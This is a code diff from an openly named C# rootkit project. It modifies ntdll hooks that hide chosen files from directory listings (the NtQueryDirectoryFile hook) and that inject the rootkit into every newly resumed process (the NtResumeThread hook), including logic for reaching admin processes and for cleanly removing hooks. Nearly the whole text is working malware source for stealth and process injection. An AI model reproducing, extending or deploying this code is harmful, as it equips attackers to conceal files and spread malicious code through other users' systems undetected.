@@ -202,7 +202,6 @@ namespace CSharpRootkit
 
             if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileDirectoryInformation)
             {
-
                 RootKitInternalStructs.NT_FILE_DIRECTORY_INFORMATION dataStruct = Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_DIRECTORY_INFORMATION>(FileInformation);
                 offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_DIRECTORY_INFORMATION>("FileNameStart");
                 FileNameLength = dataStruct.FileNameLength;
@@ -493,7 +492,6 @@ namespace CSharpRootkit
                     bool skip = HideFileNames.Contains(FileInformationFileName.ToLower()) || IsHiddenPath(Path.Combine(fileDirectoryPath, FileInformationFileName));
                     while (skip)
                     {
-
                         status = OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
                         if (status != SUCCESS)
                         {
@@ -675,15 +673,13 @@ namespace CSharpRootkit
                 }
 
             }
-
-
             return status;
         }
         private static uint NtResumeThreadHook(IntPtr ThreadHandle, IntPtr SuspendCount)
         {
             //return OriginalNtResumeThread(ThreadHandle, SuspendCount);
             uint procId = NativeMethods.GetProcessIdOfThread(ThreadHandle);
-            if (procId != NativeMethods.GetCurrentProcessId())// if the process its opening is admin, we need to get talk to a admin rootkit process to inject into it.
+            if (procId != NativeMethods.GetCurrentProcessId() && !RootKitClientInterface.IsAgainstInclusionExclusionRules((int)procId))// if the process its opening is admin, we need to get talk to a admin rootkit process to inject into it.
             {
                 if (!Utils.IsAdmin() && Utils.IsProcessAdmin((int)procId, out bool ProcIsAdmin) && ProcIsAdmin) 
                 {
@@ -693,7 +689,7 @@ namespace CSharpRootkit
                 }
                 
                 IntPtr procHandle = SharpInjector.GetProcessHandleWithRequiredRights((int)procId);
-                if (procHandle != IntPtr.Zero && !RootKitClientInterface.IsAgainstInclusionExclusionRules(procHandle) && Utils.ShouldInject(procHandle) && JankyUnPauseUntilKernel32LoadedThenPause(ThreadHandle, procHandle, ExtraWaitTimeAfterFound: 7))//we wait for the kernel32.dll to load or else injecting wont work. we also wait a extra 7ms as I found that some applications would not start properly, adding a small wait fixs this, but theres a slight chance it wont inject, but ive found 7 to be a good number
+                if (procHandle != IntPtr.Zero && Utils.ShouldInject(procHandle) && JankyUnPauseUntilKernel32LoadedThenPause(ThreadHandle, procHandle, ExtraWaitTimeAfterFound: 7))//we wait for the kernel32.dll to load or else injecting wont work. we also wait a extra 7ms as I found that some applications would not start properly, adding a small wait fixs this, but theres a slight chance it wont inject, but ive found 7 to be a good number
                 {
                     SharpInjector.Inject(procHandle, Program.InjectionEntryPoint, 100);//make sure to change this on a namespace or class or function name change
                 }
@@ -759,7 +755,7 @@ namespace CSharpRootkit
             IntPtr NtQueryDirectoryFileHookExPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
             contextManager["NtQueryDirectoryFileEx"] = new NativeFunctionHooker(NtQueryDirectoryFileExPtr, NtQueryDirectoryFileHookExPtr);
             OriginalNtQueryDirectoryFileEx = contextManager["NtQueryDirectoryFileEx"].InstallHook<NtQueryDirectoryFileExDelegate>();
-
+            
             IntPtr NtResumeThreadPtr = Utils.GetFunctionPtr("ntdll.dll", "NtResumeThread");
             tempDelegate = new NtResumeThreadDelegate(NtResumeThreadHook);
             DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
@@ -776,16 +772,18 @@ namespace CSharpRootkit
             Started = true;
             //Console.WriteLine("injected all");
         }
-        public static void Stop() 
-        { 
-            if (!Started) 
+        public static void Stop()
+        {
+            if (!Started)
             {
                 return;
             }
+            IntPtr[] PausedThreads = Utils.PauseAllThreadExceptCurrent();
             foreach (NativeFunctionHooker i in contextManager.Values) 
             {
                 i.RemoveHook();
             }
+            Utils.ResumeAndCloseAllThreads(PausedThreads);
             contextManager.Clear();
             DelgateCache.Clear();
             Started = false;
